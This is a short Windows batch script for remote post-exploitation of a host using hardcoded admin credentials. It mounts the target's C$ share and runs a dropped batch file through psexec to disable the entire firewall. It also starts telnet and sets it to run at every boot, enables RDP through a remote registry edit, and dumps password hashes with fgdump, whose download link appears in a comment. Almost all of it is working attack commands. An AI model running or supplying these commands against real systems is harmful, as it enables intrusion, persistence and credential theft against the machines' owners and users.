set targetIP=192.168.139.134
set targetUser=admin
set targetPassword=123

::::::::::::::::::::::::::::::::::::::::::
:: Create an interactive cmd.exe shell. ::
::::::::::::::::::::::::::::::::::::::::::

:: Disable the entire firewall, because killing an fly with a sledgehammer is preferred.
net use Z: \\%targetIP%\C$ /user:%targetUser% %targetPassword%
echo netsh firewall set opmode disable > disable_firewall.bat
copy disable_firewall.bat Z:\Windows\disable_firewall.bat
psexec \\%targetIP% -u %targetUser% -p %targetPassword% disable_firewall.bat

:: Start the telnet service.
sc \\%targetIP% start tlntsvr

:: Connect to newly started telnet service.
telnet %targetIP%

:: Maintain the service after a reboot.
sc \\%targetIP% config tlntsvr start= auto

:: Enable RDP and successfully RDP in with an account you created
reg add "\\%targetIP%\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
mstsc /v:%targetIP%:3389

:: Dump windows user account password hashes (need third party cmdline tool)
:: > Get fgdump from http://distro.ibiblio.org/openwall/projects/john/contrib/pwdump/fgdump-2.1.0-exeonly.zip
fgdump -h %targetIP% -u %targetUser% -p %targetPassword%
type %targetIP%.pwdump
